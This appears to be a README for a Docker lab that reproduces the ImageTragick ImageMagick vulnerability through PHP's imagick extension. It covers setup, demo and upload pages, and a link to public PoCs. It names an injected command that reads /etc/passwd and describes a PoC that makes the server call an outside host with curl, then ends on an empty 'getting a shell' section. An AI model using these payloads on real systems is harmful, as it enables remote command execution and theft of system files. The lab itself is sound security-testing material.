## Environment Setup

Enter the following commands:

```
docker-compose build
docker-compose up -d
```

Visit `http://your-ip/` and you'll see three files:

```bash
├── demo.php # use vul.jpg + identify command to test 
├── upload.php # Support users to upload a file，deliver it to PHP's imagick extension, and then the vulnerability will be triggered
└── vul.jpg # a simple POC
```

## POC

Some POCs used: https://github.com/ImageTragick/PoCs

You can take a test by visiting `http://your-ip/demo.php`. Even though the command executed (`cat /etc/passwd > /tmp/success`) doesn't have a specific character in the response, the `/tmp/success` file is successfully created in the docker container:

Also you can visit `http://your-ip/upload.php` to test another POC. Upload the POC file and packets are as follows（**Attention: this is another POC**）：

```
POST /upload.php HTTP/1.1

```

As shown, `www.leavesongs.com:8889` has received the http request, proving that the curl command is executed successfully：

POC of getting a shell：

```
